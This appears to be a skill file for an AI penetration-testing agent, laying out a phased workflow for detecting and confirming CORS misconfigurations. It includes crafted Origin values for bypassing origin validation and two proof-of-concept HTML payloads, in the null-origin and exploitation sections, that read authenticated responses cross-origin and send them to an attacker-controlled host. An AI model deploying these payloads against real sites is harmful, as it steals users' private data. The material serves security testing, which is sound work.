---
name: testing-cors
description: CORS misconfiguration testing. Use when the application returns Access-Control-Allow-Origin or other CORS headers — or when testing cross-origin data access on API endpoints serving sensitive data with credential-based authentication. Covers origin reflection patterns, null origin exploitation, subdomain wildcard abuse, and credential-based cross-origin data theft.
---

# CORS Misconfiguration Testing

CORS misconfigurations allow attacker-controlled websites to read authenticated responses from the vulnerable application, bypassing the same-origin policy. The impact depends entirely on WHAT data the affected endpoints serve. CORS misconfiguration on a public endpoint is informational. CORS misconfiguration on an endpoint returning user PII with credentials is High severity.

## Reference Files

- [exploitation.md](./exploitation.md) — PoC HTML construction, null origin techniques, and exploitation scenarios

## Mental Model

The browser enforces same-origin policy: `evil.com` cannot read responses from `target.com`. CORS is the mechanism that RELAXES this policy. When the server says `Access-Control-Allow-Origin: evil.com` with `Access-Control-Allow-Credentials: true`, it tells the browser: "Yes, evil.com can read my responses, even with cookies attached."

**The vulnerability is not that CORS headers exist — it's that they're too permissive.** The server trusts origins it shouldn't.

**Three conditions required for exploitable CORS:**
1. `Access-Control-Allow-Origin` reflects or accepts the attacker's origin
2. `Access-Control-Allow-Credentials: true` (otherwise, no cookies are sent — only public data accessible)
3. The endpoint returns SENSITIVE data that requires authentication

Missing ANY of these three = no exploitable CORS.

## Workflow

```
1. BASELINE → 2. CONFIRMATION → 3. NEGATIVE VERDICT → 4. EXPLOITATION
   (detect CORS)    (test origins)    (declare secure)     (demonstrate theft)

   Stop conditions checked at every step ↓
```

---

## Phase 1: Baseline

### Step 1.1: CORS Header Detection
Send requests with `Origin: https://evil.com` to endpoints that return sensitive data. Check response for CORS headers.

### Step 1.2: Endpoint Sensitivity Assessment
Does the endpoint require authentication AND return user-specific sensitive data? If it returns the same data regardless of cookies → not exploitable (public data).

### Step 1.3: Existing CORS Configuration
What does the current `Access-Control-Allow-Origin` value look like? Fixed domain? Wildcard? Reflected?

### Reasoning Checkpoint
```
[PHASE-1] Baseline
[ENDPOINT] {URL}
[ACAO-VALUE] {current ACAO value}
[ACAC-VALUE] {true / false / absent}
[SENSITIVE-DATA] {yes — what kind / no — public}
[DECISION] {Proceed / No CORS headers / No sensitive data — limited impact}
```

---

## Phase 2: Confirmation

### Confidence Definitions
| Level | For CORS |
|-------|---------|
| HIGH | Arbitrary attacker origin reflected in ACAO with ACAC:true, on endpoint returning authenticated sensitive data |
| MEDIUM | Origin reflected but without ACAC:true, or data is not user-specific |
| LOW | ACAO is fixed/restrictive, no origin reflection |

### Step 2.1: Origin Reflection Testing (Progressive)

Test these origins, in order from most to least obvious:

```
1. Origin: https://evil.com                          (arbitrary domain)
2. Origin: https://evil-target.com                   (contains target name)
3. Origin: https://targetcom.evil.com                (target as subdomain of attacker)
4. Origin: https://target.com.evil.com               (target.com as prefix)
5. Origin: https://subdomain.target.com              (subdomain of target)
6. Origin: https://evil.subdomain.target.com         (attacker subdomain under target)
7. Origin: null                                      (null origin — from sandboxed iframes, file://, data:)
8. Origin: https://target.com                        (self — baseline)
9. Origin: (no Origin header)                        (omitted entirely)
```

For EACH test, check:
- Does `Access-Control-Allow-Origin` reflect the sent origin?
- Is `Access-Control-Allow-Credentials: true` present?
- What does the response body contain?

### Step 2.2: Pattern Analysis

Based on test results, identify the validation pattern:

| Behavior | Validation Type | Exploitability |
|----------|----------------|---------------|
| ANY origin reflected | No validation | Trivially exploitable |
| Only origins containing "target.com" reflected | Regex contains check | Exploitable: `target.com.evil.com` |
| Only *.target.com reflected | Subdomain wildcard | Exploitable if you control a subdomain, or XSS on any subdomain |
| Only specific origins reflected | Allowlist | Not exploitable (unless XSS on allowed origin) |
| null reflected with ACAC:true | Null origin accepted | Exploitable via sandboxed iframe |
| ACAO:* (star) | Wildcard | NOT exploitable with credentials (browser blocks ACAO:* + ACAC:true) |

### Step 2.3: Null Origin Exploitation

If `null` origin is accepted:
```html
<iframe sandbox="allow-scripts" src="data:text/html,<script>
  fetch('https://target.com/api/sensitive-data', {credentials: 'include'})
  .then(r => r.text())
  .then(d => fetch('https://attacker.com/steal?data=' + encodeURIComponent(d)))
</script>"></iframe>
```
Sandboxed iframes send `Origin: null`. If the server reflects it → cross-origin data theft.

**Max confirmation attempts: 8 origin variations.**

### Reasoning Checkpoint
```
[PHASE-2] Confirmation
[ORIGINS-TESTED] {list which origins were reflected}
[ACAC] {true for reflected origins?}
[VALIDATION-PATTERN] {none / contains / subdomain / allowlist / null}
[EXPLOITABLE] {yes — with which origin / no}
[CONFIDENCE] {HIGH / MEDIUM / LOW}
[DECISION] {Proceed to exploitation / Negative verdict}
```

---

## Negative Verdict

### True Negative Conditions
- ACAO uses strict allowlist (not reflecting arbitrary origins)
- OR: ACAO reflects but ACAC is not true
- OR: ACAO is `*` (no credential-based exploitation per spec)
- OR: Affected endpoints return no sensitive/authenticated data
- Null origin not accepted
- Multiple origin patterns tested

### Structured Log
```
[VULN-NEGATIVE]
[ENDPOINT] {URL}
[STEPS-RUN] {origins tested, ACAC status}
[SIGNAL] {CORS properly configured}
[CONCLUSION] {no exploitable CORS misconfiguration}
[ACTION] Endpoint cleared for CORS.
```

---

## Phase 3: Exploitation

### Level 1: Data Theft PoC
Create HTML page that makes credentialed cross-origin request and exfiltrates the response. `[EXTERNAL INFRA REQUIRED]`

```html
<script>
  fetch('https://target.com/api/me', {credentials: 'include'})
  .then(response => response.json())
  .then(data => {
    // Send stolen data to attacker server
    fetch('https://attacker.com/log?data=' + btoa(JSON.stringify(data)));
  });
</script>
```

**Stop condition:** Demonstrated cross-origin data read with sensitive content → STOP.

---

## Things to Do

- Always check BOTH ACAO reflection AND ACAC:true — both are required for credential-based exploitation
- Test null origin — it's commonly overlooked in validation
- Verify the endpoint returns SENSITIVE data before reporting — CORS on public data is not a vulnerability
- Check if any reflected origin works for both GET and state-changing methods (POST/PUT)

## Things Not to Do

- Do not report CORS on public/unauthenticated endpoints as high severity
- Do not confuse ACAO:* (wildcard without credentials) with reflected origin + ACAC:true
- Do not assume subdomain reflection is unexploitable — XSS on any subdomain enables exploitation
- Do not skip null origin testing — sandboxed iframes trigger it

## Cross-Skill Links

- [[xss]] — XSS on the target domain bypasses CORS entirely (same-origin)
- [[xss]] — XSS on an allowed origin enables exploitation of restrictive CORS
